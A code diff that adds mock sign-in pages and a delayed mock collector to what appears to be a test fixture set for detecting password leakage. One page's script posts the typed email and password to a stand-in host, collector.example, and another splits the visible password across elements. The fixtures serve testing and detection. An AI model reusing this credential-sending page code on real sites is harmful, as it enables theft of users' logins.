@@ -58,6 +58,21 @@ export const pages: Record<string, string> = {
   "/signin-again-shadow": SIGN_IN("https://collector.example/again-shadow"),
   "/signin-echo": SIGN_IN("https://collector.example/echo"),
   // A handler copies "Password: " + the value into a visible text field: the password is in a value, not equal to it.
+  // The password shown one character to a node: no node holds it whole.
+  "/signin-split": SIGN_IN("https://collector.example/c").replace(
+    "</form>",
+    `<div id="out" style="position:absolute;left:0;top:300px"></div></form><script>document.getElementById("pass").addEventListener("input", (e) => { document.getElementById("out").innerHTML = Array.from(e.target.value, (c) => "<span>" + c + "</span>").join(""); });</script>`,
+  ),
+  // The answer's headers come at once and its body, a rejection, a second and a half later.
+  "/signin-slow": `<!doctype html><html><body style="margin:0;font:16px sans-serif">
+<input id="user" style="position:absolute;left:0;top:100px;width:300px;height:30px">
+<input id="pass" type="password" style="position:absolute;left:0;top:160px;width:300px;height:30px">
+<button id="go" style="position:absolute;left:0;top:220px;width:120px;height:32px">Sign in</button>
+<script>document.getElementById("go").onclick = () => {
+  const body = new URLSearchParams({ email: document.getElementById("user").value, password: document.getElementById("pass").value });
+  document.body.innerHTML = "<p>Signing in</p>";
+  fetch("https://collector.example/slow", { method: "POST", body }).then((r) => r.text()).then((t) => { document.body.innerHTML = t; });
+};</script></body></html>`,
   "/signin-embed": SIGN_IN("https://collector.example/c").replace(
     "</form>",
     `<input id="copy" style="position:absolute;left:0;top:300px;width:500px;height:30px"></form><script>document.getElementById("pass").addEventListener("input", (e) => { document.getElementById("copy").value = "Password: " + e.target.value; });</script>`,
@@ -105,6 +120,18 @@ const collector = (url: URL, method: string, body = ""): Response => {
       headers: { location: `https://collector.example/thanks?u=${url.searchParams.get("u") ?? ""}` },
     });
   if (url.pathname === "/c401") return new Response(AGAIN, { status: 401, headers: { "content-type": "text/html" } });
+  if (url.pathname === "/slow")
+    return new Response(
+      new ReadableStream({
+        start(controller) {
+          setTimeout(() => {
+            controller.enqueue(new TextEncoder().encode(AGAIN));
+            controller.close();
+          }, 1_500);
+        },
+      }),
+      { status: 200, headers: { "content-type": "text/html", "access-control-allow-origin": "*" } },
+    );
   if (url.pathname === "/g")
     return new Response(null, {
       status: 302,
